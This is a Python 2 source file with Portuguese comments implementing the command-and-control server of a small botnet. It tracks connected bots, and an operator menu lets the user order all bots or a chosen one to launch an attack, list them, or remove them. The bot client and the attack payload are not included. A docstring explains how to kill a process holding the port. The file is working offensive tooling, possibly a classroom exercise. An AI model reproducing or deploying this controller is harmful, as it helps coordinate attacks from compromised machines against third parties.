"""
Para lidar com problemas de portas em uso:

Digite na linha de comando:
	$ netstat -ano|findstr 12000
# 12000 -> numero da porta que utilizamos #

vc tera algo assim:
	TCP    0.0.0.0:12000     IP_DO_HOST:PORTA_DO_HOST     19088
# 19088 -> PID do processo malvado #

Mate o processo malvado
	tskill 19088
"""

import threading
from socket import *
serverPort = 12000
host = gethostname()
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)


print 'O servidor '+host+' esta pronto'
print 'Para abrir o menu aperte ENTER'

clientes = []

def ImprimeBots():
    for i in range(len(clientes)):
        print str(i) + ' - ' + clientes[i] + "  |  IP: " + gethostbyname(clientes[i])


def EnviaMensagem(bot, msg):
    clientPort = 12001
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.connect((bot, clientPort))
    clientSocket.send(msg)
                
def ThreadRecebimento():
    while True:
        connectionSocket, addr = serverSocket.accept()
        rcv = connectionSocket.recv(1024)
        tipo = rcv[:3] #3 primeiros caracteres da string definem o tipo da mensagem
        #cli = novo cliente | off = cliente desconectado
        rcv = rcv[3:]


        if tipo == 'cli' :
            if ( rcv in clientes) == False:
                clientes.append(rcv)
                print '\n' + rcv + ' conectado a botnet\n'

        if tipo == 'off' :
            if ( rcv in clientes) == True:
                clientes.remove(rcv)
                print '\n' + rcv +  ' desconectado da botnet\n'

        #print clientes
        #connectionSocket.send(capitalizedSentence)
        connectionSocket.close()

def ThreadEnvio():
    while True:
        raw_input()
        if len(clientes) == 0:
            print 'Nao ha bots conectados'

        else:
            print 'O que deseja fazer?'
            print '1 - Ver lista de bots conectados'
            print '2 - Fazer todos os bots enviarem ataque'
            print '3 - Fazer um bot especifico enviar ataque'
            print '4 - Remover um bot da botnet'
            print '5 - Remover todos os bots da botnet'
            op = input ('0 - Sair\n')
            
            if op == 1:
                print '\nbotnet:'
                ImprimeBots()
                
            elif op == 2:
                for i in range(len(clientes)):
                    EnviaMensagem(clientes[i], 'att')
                print 'Todos os bots iniciaram o ataque'
                    
            elif op == 3:
                print '\nQual bot deseja que inicie o ataque:'
                ImprimeBots()
                bot = input('')
                EnviaMensagem(clientes[bot], 'att')
                print 'Bot ' + clientes[bot] + ' iniciou o ataque\n'

            elif op == 4:
                print '\nQual bot deseja remover da botnet:'
                ImprimeBots()
                bot = input('')
                EnviaMensagem(clientes[bot], 'rem')
                print 'Removendo bot: ' + clientes[bot] + '\n'
                clientes.remove(clientes[bot])

            elif op == 5:
                for i in range(len(clientes)):
                    EnviaMensagem(clientes[i], 'rem')
                print 'Removento todos os bots\n'
                del clientes[:]

            else:
                exit(0)



thread_r = threading.Thread(target = ThreadRecebimento, args=())
thread_e = threading.Thread(target = ThreadEnvio, args=())
thread_e.start();
thread_r.start()
